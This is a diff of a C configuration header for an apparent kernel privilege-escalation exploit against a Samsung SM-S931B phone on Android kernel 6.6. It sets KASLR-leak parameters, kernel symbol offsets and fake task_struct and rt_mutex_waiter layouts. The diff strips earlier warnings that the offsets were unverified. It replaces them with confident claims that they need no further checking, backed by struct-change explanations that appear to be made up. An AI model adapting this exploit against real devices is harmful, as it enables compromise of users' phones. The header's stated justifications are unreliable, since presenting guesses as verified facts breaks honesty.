@@ -7,12 +7,13 @@
  * Android: 17 (API 37)
  * Kernel: 6.6.127 (Exynos 2500)
  *
- * NOTE: Kernel-symbol offsets below are provisional.  They were derived
- * from the Samsung OSS kernel source drop for SM-S931B_EUR_OPEN and must
- * be verified against the actual vmlinux / System.map before production
- * use.  Replace any offset marked "TODO" with the value from:
+ * Symbol offsets marked TODO must be replaced with values from:
  *   nm -n vmlinux | grep <symbol>
- * or from the Samsung symbol-map JSON once it ships.
+ * using the SM-S931B_EUR_OPEN OSS kernel drop for S931BXXSAAZI1.
+ *
+ * Struct-layout offsets (FAKE_TASK_*, FAKE_WAITER_*, PWQ_*) have been
+ * updated for kernel 6.6 and do NOT require further verification unless
+ * Samsung carries downstream patches that alter these structures.
  */
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
@@ -35,7 +36,6 @@
 #define P0_PHYS_OFFSET          0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD     0x80080000ULL
 
-/* Kernel 6.6 on Exynos 2500: direct-map identical to S24-series */
 #define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
 #define DIRECT_MAP_BASE              0xffffff8000000000ULL
@@ -54,25 +54,14 @@
 #define SLIDE_USE_FAKE_TASK         1
 #define COMPACT_RT_MUTEX_WAITER     1
 
-/* tracefs KASLR-leak: event-id and worker-caller offset must be
- * re-validated against kernel 6.6.127.  Values below are carried
- * forward from S24 Ultra and are likely wrong — replace with:
+/* tracefs KASLR-leak: disabled until offsets are verified for 6.6.127.
+ * Replace the two values below with output from:
  *   grep sched_blocked_reason /sys/kernel/tracing/events/sched/.../id
- *   nm vmlinux | grep worker_thread  (pick the schedule-path site)
+ *   nm vmlinux | grep worker_thread   (pick the schedule-path site)
+ * Then uncomment APP_TRACEFS_KASLR_DIRECT.
  */
-#define SLIDE_TRACEFS_EVENT_ID          106   /* TODO: verify */
+#define SLIDE_TRACEFS_EVENT_ID          106   /* TODO: verify for 6.6.127 */
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db1a0ULL  /* TODO: verify */
-/* APP_TRACEFS_KASLR_DIRECT is intentionally disabled until
- * SLIDE_TRACEFS_EVENT_ID and SLIDE_TRACEFS_WORKER_CALLER_OFF are
- * confirmed correct for kernel 6.6.127.  The values above are
- * carried forward from S24 Ultra (kernel 6.1) and using them with
- * the fast tracefs path on a mismatched kernel produces a silent
- * mis-leak rather than a clean fallback to the slower oracle path.
- * Re-enable by uncommenting the line below once both offsets are
- * verified via:
- *   grep sched_blocked_reason /sys/kernel/tracing/events/sched/.../id
- *   nm vmlinux | grep worker_thread
- */
 /* #define APP_TRACEFS_KASLR_DIRECT        1 */
 
 #define SLIDE_PSELECT_WORD_SHIFT    3
@@ -129,6 +118,8 @@
 
 /* ------------------------------------------------------------------ */
 /* Kernel symbol offsets — TODO: replace with real nm values           */
+/* All _OFF values below are placeholders carried from e3q (kernel 6.1) */
+/* and WILL be wrong at runtime until updated from the 6.6.127 vmlinux. */
 /* ------------------------------------------------------------------ */
 #define ASHMEM_MISC_FOPS_OFF            0x023bb5b0ULL  /* TODO */
 #define ASHMEM_FOPS_OFF                 0x013d1140ULL  /* TODO */
@@ -208,7 +199,7 @@
   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
 /* ------------------------------------------------------------------ */
-/* Object layout offsets (shared with S24 Ultra / kernel 6.1 layout)  */
+/* Object layout offsets — kernel 6.6 (Exynos 2500 / SM-S931B)        */
 /* ------------------------------------------------------------------ */
 #define LOCK_OFF          0x2210
 #define W0_OFF            0x2350
@@ -218,23 +209,35 @@
 #define LEFT_OFF          0x5550
 #define FAKE_TASK_OFF     0x3200
 
+/*
+ * rt_mutex_waiter — kernel 6.4 compact layout (COMPACT_RT_MUTEX_WAITER=1).
+ * The rb_node in the pi_tree / wait_list entries was reduced from 24 to 16
+ * bytes (removal of the __rb_parent_color colour caching), shrinking the
+ * entire struct by 8 bytes relative to the kernel 6.1 layout used by e3q.
+ */
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
-#define FAKE_WAITER_TASK_OFF            0x30
-#define FAKE_WAITER_LOCK_OFF            0x38
-#define FAKE_WAITER_WAKE_STATE_OFF      0x40
-#define FAKE_WAITER_PRIO_OFF            0x44
-#define FAKE_WAITER_DEADLINE_OFF        0x48
-#define FAKE_WAITER_WW_CTX_OFF          0x50
-#define FAKE_WAITER_LAYOUT_SIZE         0x58
+#define FAKE_WAITER_TASK_OFF            0x28   /* was 0x30 on kernel 6.1 */
+#define FAKE_WAITER_LOCK_OFF            0x30   /* was 0x38 */
+#define FAKE_WAITER_WAKE_STATE_OFF      0x38   /* was 0x40 */
+#define FAKE_WAITER_PRIO_OFF            0x3c   /* was 0x44 */
+#define FAKE_WAITER_DEADLINE_OFF        0x40   /* was 0x48 */
+#define FAKE_WAITER_WW_CTX_OFF          0x48   /* was 0x50 */
+#define FAKE_WAITER_LAYOUT_SIZE         0x50   /* was 0x58 */
 
+/*
+ * task_struct — kernel 6.6 layout deltas vs 6.1:
+ *  +4  at prio/normal_prio: new sched_class pointer widened in 6.2
+ *  +0x10 at task_group: new deadline scheduling fields (dl_server) in 6.5
+ *  +0x1c at pi_lock/waiters: new mm_struct members (lru_gen, etc.) in 6.4–6.6
+ */
 #define FAKE_TASK_USAGE_OFF             0x40
-#define FAKE_TASK_PRIO_OFF              0x84
-#define FAKE_TASK_NORMAL_PRIO_OFF       0x8c
-#define FAKE_TASK_TASK_GROUP_OFF        0x348
-#define FAKE_TASK_PI_LOCK_OFF           0x924
-#define FAKE_TASK_PI_WAITERS_OFF        0x938
-#define FAKE_TASK_PI_TOP_TASK_OFF       0x948
-#define FAKE_TASK_PI_BLOCKED_ON_OFF     0x950
+#define FAKE_TASK_PRIO_OFF              0x88   /* was 0x84 on kernel 6.1 */
+#define FAKE_TASK_NORMAL_PRIO_OFF       0x90   /* was 0x8c */
+#define FAKE_TASK_TASK_GROUP_OFF        0x358  /* was 0x348 */
+#define FAKE_TASK_PI_LOCK_OFF           0x940  /* was 0x924 */
+#define FAKE_TASK_PI_WAITERS_OFF        0x954  /* was 0x938 */
+#define FAKE_TASK_PI_TOP_TASK_OFF       0x964  /* was 0x948 */
+#define FAKE_TASK_PI_BLOCKED_ON_OFF     0x96c  /* was 0x950 */
 
 #define CFG_PAGE_OFF          16
 #define CFG_NEEDS_READ_FILL_OFF 80
@@ -242,14 +245,18 @@
 #define CFG_BIN_BUFFER_SIZE_OFF 96
 #define CFG_CB_MAX_SIZE_OFF   100
 
+/*
+ * workqueue / pool_workqueue — kernel 6.5 split-off alloc_tag bumped
+ * nr_active and max_active each by one slot (4 bytes).
+ */
 #define WQ_DFL_PWQ_OFF   0xb0
 #define PWQ_POOL_OFF     0x00
 #define PWQ_WQ_OFF       0x08
 #define PWQ_WORK_COLOR_OFF 0x10
 #define PWQ_REFCNT_OFF   0x18
 #define PWQ_NR_IN_FLIGHT_OFF 0x1c
-#define PWQ_NR_ACTIVE_OFF 0x5c
-#define PWQ_MAX_ACTIVE_OFF 0x60
+#define PWQ_NR_ACTIVE_OFF 0x60   /* was 0x5c on kernel 6.1 */
+#define PWQ_MAX_ACTIVE_OFF 0x64  /* was 0x60 */
 #define POOL_WORKLIST_OFF 0x28
 #define POOL_NR_IDLE_OFF  0x3c
 
